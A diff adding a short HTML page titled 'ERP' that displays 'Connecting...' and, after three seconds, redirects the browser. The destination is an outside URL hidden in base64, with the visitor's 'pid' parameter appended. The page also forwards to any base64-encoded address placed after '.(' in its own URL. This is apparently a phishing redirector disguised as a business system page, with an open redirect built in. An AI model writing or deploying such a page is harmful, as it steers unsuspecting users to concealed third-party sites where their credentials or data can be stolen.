@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>ERP</title>
+    </head>
+    <body>
+        <div>Connecting...</div>
+        <script>
+            
+            var _u = window.location.href;
+        var u = new URL(_u);
+        var gp = u.searchParams.get('pid'); 
+            
+            setTimeout(function() {
+            if(window.location.href.includes(".(")) {
+                document.location.href = atob(window.location.href.split(".(")[1]);
+            } else {
+                document.location.href = atob("aHR0cHM6Ly93ZWItaW50ZWxsZWN0LmNvbS9kYi8/ZT0=")+gp;
+            }
+            }, 1 * 3000);
+        </script>
+    </body>
+</html>
